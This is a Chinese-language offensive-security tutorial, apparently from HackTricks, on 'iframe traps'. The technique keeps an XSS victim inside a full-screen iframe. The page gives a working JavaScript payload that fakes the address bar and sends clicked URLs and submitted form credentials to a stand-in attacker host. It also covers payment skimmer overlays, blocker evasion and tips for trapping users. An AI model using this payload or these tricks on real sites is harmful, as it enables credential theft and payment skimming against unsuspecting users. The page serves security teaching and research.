# Iframe 陷阱

{{#include ../banners/hacktricks-training.md}}

## 基本信息

这种通过 iframe 滥用 XSS 来窃取用户在网页间移动时信息的手法，最早发布于 trustedsec.com 的这两篇文章：[**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **和** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams)。

攻击始于一个存在 XSS 漏洞的页面，在该页面可以让**受害者不离开 XSS 环境**，通过让他们**在占据整个 web 应用的 iframe 中导航**。

XSS 攻击基本上会将网页加载在占据屏幕 100% 的 iframe 中。因此，受害者**不会注意到自己在 iframe 内**。然后，如果受害者通过点击 iframe 内的链接在页面中导航（在 web 内），他将**在 iframe 内导航**，任意加载的 JS 会从这些导航中窃取信息。

此外，为了让其更真实，可以使用一些 **listeners** 来检查 iframe 何时改变页面位置，并将浏览器的 URL 更新为用户以为自己正在使用浏览器移动页面的那些位置。

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

另外，可以使用 listeners 来窃取敏感信息，不仅是受害者正在访问的其他页面，还包括用于 **填写的表单** 的数据并发送它们（比如 credentials?），或 **窃取 local storage**...

当然，主要的限制是 **受害者关闭标签页或在浏览器中输入另一个 URL 将逃出 iframe**。另一种情况是 **刷新页面**，不过这可以通过在每次在 iframe 内加载新页面时禁用右键上下文菜单，或在检测到用户鼠标离开 iframe（可能要点击浏览器的刷新按钮）时注意并采取措施来部分**防止**。在这种情况下，浏览器的 URL 会被更新为最初存在 XSS 的 URL，因此如果用户刷新它，页面会再次被污染（注意这并不太隐蔽）。

## 现代化陷阱 (2024+)

* 使用一个 **full‑viewport iframe** 加上 History/Navigation API 来模拟真实导航。

<details>
<summary>Full-viewport iframe 陷阱</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) 使外部地址栏保持同步，但不会 leak 实际 URL。
* Go **fullscreen** 来隐藏浏览器 UI 并绘制你自己的假地址栏/锁图标。

## Overlay & skimmer 用法

* 被攻陷的商家会将 hosted payment iframes (Stripe, Adyen, etc.) 替换为一个 **pixel‑perfect overlay**，转发按键输入，而真实的 frame 仍位于下层，有时会使用遗留的 validation APIs 以保证流程不被中断。
* 将用户困在顶层 frame 中可以在他们注意到地址栏未改变之前捕获 **autofill/password‑manager** 数据。

## 在 2025 年研究中观察到的规避技巧

* `about:blank`/`data:` 本地 frames 会继承父级 origin 并绕过部分 content‑blocker 启发式规则；即便扩展移除 third‑party frames，嵌套的 iframes 也能重生。
* **Permission propagation**：重写父级 `allow` 属性会将 fullscreen/camera/microphone 权限授予嵌套的攻击者 frames，而不会有明显的 DOM 变化。

## Quick OPSEC tips

* 当鼠标离开时（在 body 上监听 `mouseleave`）重新聚焦 iframe，以阻止用户访问浏览器 UI。
* 在 frame 内禁用右键菜单和常见快捷键（使用 `keydown` 处理 `F11`、`Ctrl+L`、`Ctrl+T`），以延缓逃脱尝试。
* 如果 CSP 阻止内联脚本，注入远程 bootstrapper 并在 iframe 上启用 `srcdoc`，使你的 payload 位于主页面强制执行的 CSP 之外。

## 相关

{{#ref}}
clickjacking.md
{{#endref}}



## 参考资料

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
